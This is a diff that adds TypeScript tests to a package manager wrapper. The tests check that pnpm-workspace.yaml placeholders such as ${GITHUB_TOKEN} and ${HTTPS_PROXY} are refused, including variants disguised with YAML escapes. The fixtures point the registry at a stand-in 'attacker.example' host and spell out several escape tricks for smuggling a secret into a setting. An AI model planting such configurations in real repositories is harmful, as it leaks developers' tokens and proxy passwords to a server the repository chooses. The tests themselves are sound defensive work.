@@ -662,6 +662,77 @@ describe("PackageManager.storeRoot", () => {
   })
 
   /**
+   * pnpm expands `${NAME}` in `pnpm-workspace.yaml` settings and keys after
+   * decoding YAML escapes. With `.npmrc` forwarding `GITHUB_TOKEN`, pnpm 11.25
+   * sent `user-agent: ua-<token>` to `registry: http://127.0.0.1:<port>/`
+   * named in the same file, so the repository chose the server that received
+   * the host variable. The bootstrap list forwards proxy URLs, which can carry
+   * proxy passwords, even without a `.npmrc`.
+   */
+  it.each(
+    [
+      ["placeholder", "userAgent: \"ua-${GITHUB_TOKEN}\""],
+      ["hex-escaped dollar", "userAgent: \"ua-\\x24{GITHUB_TOKEN}\""],
+      ["unicode-escaped dollar", "userAgent: \"ua-\\u0024{GITHUB_TOKEN}\""],
+      ["long unicode-escaped dollar", "userAgent: \"ua-\\U00000024{GITHUB_TOKEN}\""],
+      ["escaped brace", "userAgent: \"ua-$\\x7BGITHUB_TOKEN}\""],
+      ["escaped line break", "userAgent: \"ua-$\\\n  {GITHUB_TOKEN}\""],
+      ["placeholder key", "\"${GITHUB_TOKEN}\": unused"]
+    ] as const
+  )("refuses a pnpm-workspace.yaml placeholder: %s", async (_label, line) => {
+    await withFixture("package-manager-workspace-placeholder", async (root) => {
+      await Fs.writeFile(NodePath.join(root, ".npmrc"), "//registry.example/:_authToken=${GITHUB_TOKEN}\n", "utf8")
+      await Fs.writeFile(
+        NodePath.join(root, "pnpm-workspace.yaml"),
+        `registry: http://attacker.example/\n${line}\n`,
+        "utf8"
+      )
+      const executable = NodePath.join(root, "pnpm.mjs")
+      const marker = NodePath.join(root, "spawned")
+      await writeExecutable(
+        executable,
+        `import { writeFileSync } from "node:fs"\nwriteFileSync(${
+          JSON.stringify(marker)
+        }, String(process.env.GITHUB_TOKEN))`
+      )
+      const manager = await makePnpm(root, executable, {
+        environment: { PATH: process.env.PATH, GITHUB_TOKEN: "host-secret" }
+      })
+      await expect(Effect.runPromise(manager.version)).rejects.toMatchObject({
+        code: "unsafe_configuration",
+        message: expect.stringContaining("pnpm-workspace.yaml")
+      })
+      await expect(Fs.stat(marker)).rejects.toMatchObject({ code: "ENOENT" })
+    })
+  })
+
+  it("refuses a pnpm-workspace.yaml placeholder for a bootstrap variable without an .npmrc", async () => {
+    await withFixture("package-manager-workspace-bootstrap-placeholder", async (root) => {
+      await Fs.writeFile(NodePath.join(root, "pnpm-workspace.yaml"), "userAgent: \"${HTTPS_PROXY}\"\n", "utf8")
+      const executable = NodePath.join(root, "pnpm.mjs")
+      await writeExecutable(executable, "console.log(\"11.21.0\")")
+      const manager = await makePnpm(root, executable, {
+        environment: { PATH: process.env.PATH, HTTPS_PROXY: "http://user:proxy-secret@proxy.example:8080" }
+      })
+      await expect(Effect.runPromise(manager.version)).rejects.toMatchObject({ code: "unsafe_configuration" })
+    })
+  })
+
+  it("accepts pnpm-workspace.yaml override version references", async () => {
+    await withFixture("package-manager-workspace-override-reference", async (root) => {
+      await Fs.writeFile(
+        NodePath.join(root, "pnpm-workspace.yaml"),
+        "packages:\n  - \"packages/*\"\noverrides:\n  react: $react\n",
+        "utf8"
+      )
+      const executable = NodePath.join(root, "pnpm.mjs")
+      await writeExecutable(executable, "console.log(\"11.21.0\")")
+      const manager = await makePnpm(root, executable, { environment: { PATH: process.env.PATH } })
+      expect(await Effect.runPromise(manager.version)).toBe("11.21.0")
+    })
+  })
+
+  /**
    * The credential is bound to an allowed host, but a repository proxy still
    * received it (pnpm 10 sent `Authorization: Bearer <secret>` to a capturing
    * proxy for `registry=http://registry.npmjs.org/`).
